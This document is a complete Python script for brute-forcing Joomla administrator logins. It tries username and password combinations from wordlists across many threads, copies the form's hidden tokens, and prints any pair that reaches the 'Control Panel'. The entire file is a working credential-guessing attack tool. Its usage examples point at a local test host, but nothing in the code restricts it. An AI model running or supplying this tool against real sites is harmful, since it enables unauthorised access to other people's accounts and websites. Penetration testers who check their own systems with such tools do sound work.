#!/bin/env python

from requests import Session, Response
from parsel import Selector
from multiprocessing.pool import ThreadPool
from tqdm import tqdm
from functools import partial
from itertools import product
from argparse import ArgumentParser, RawTextHelpFormatter


def login(url: str, login: tuple[str, str]):
    username, password = login
    session = Session()

    response = session.get(url)
    selector = Selector(response.text)
    data = {
        "username": username,
        "passwd": password,
    }
    for input in selector.css(".loginform > input"):
        data[input.attrib["name"]] = input.attrib["value"]

    response = session.post(
        url,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=data,
    )

    return (login, response)


if __name__ == "__main__":
    parser = ArgumentParser(
        description="Brute-force login form authentication for Joomla",
        formatter_class=RawTextHelpFormatter,
        epilog="""Examples:           
    python main.py http://joomla.local/administrator/index.php -u admin -p 123456 -t1
    python main.py http://joomla.local/administrator/index.php -u admin -P rockyou.txt
    python main.py http://joomla.local/administrator/index.php -U users.txt -p 123456
    python main.py http://joomla.local/administrator/index.php -U users.txt -P passwords.txt
    """,
    )

    parser.add_argument(
        "url",
        help="Base URL of the target web application authentication (e.g., http://joomla.local/administrator/index.php)",
    )

    user_group = parser.add_mutually_exclusive_group(required=True)
    user_group.add_argument(
        "-u",
        "--user",
        metavar="USERNAME",
        help="Single username to test against the login form",
    )
    user_group.add_argument(
        "-U",
        "--users",
        metavar="USER_FILE",
        help="Path to a file containing a list of usernames (one per line)",
    )

    pass_group = parser.add_mutually_exclusive_group(required=True)
    pass_group.add_argument(
        "-p",
        "--password",
        metavar="PASSWORD",
        help="Single password to test against the login form",
    )
    pass_group.add_argument(
        "-P",
        "--passwords",
        metavar="PASS_FILE",
        help="Path to a file containing a list of passwords (one per line)",
    )

    parser.add_argument(
        "-c",
        "--continue",
        dest="continue_after_success",
        action="store_true",
        help="Continue testing even after a valid username/password combination is found",
    )

    parser.add_argument(
        "-t",
        "--threads",
        dest="threads",
        type=int,
        default=10,
        help="Number of concurrent threads to use for login attempts.",
    )

    args = parser.parse_args()

    if args.user is not None:
        users = [args.user]
    else:
        with open(args.users, errors="ignore") as file:
            users = file.read().splitlines()

    if args.password is not None:
        passwords = [args.password]
    else:
        with open(args.passwords, errors="ignore") as file:
            passwords = file.read().splitlines()

    logins = list(product(users, passwords))

    with ThreadPool(args.threads) as pool:
        password: str
        response: Response
        try:
            for (username, password), response in tqdm(
                pool.imap_unordered(partial(login, args.url), logins),
                total=len(logins),
                leave=False,
            ):
                selector = Selector(response.text)
                message = selector.css(".alert-message").xpath("text()").extract_first()

                if (
                message == "Username and password do not match or you do not have an account yet."
                ):
                    pass
                elif response.text.find("Control Panel") > 0:
                    tqdm.write(f"{username}:{password}")
                    if not args.continue_after_success:
                        break
        except KeyboardInterrupt:
            pass
        pool.terminate()
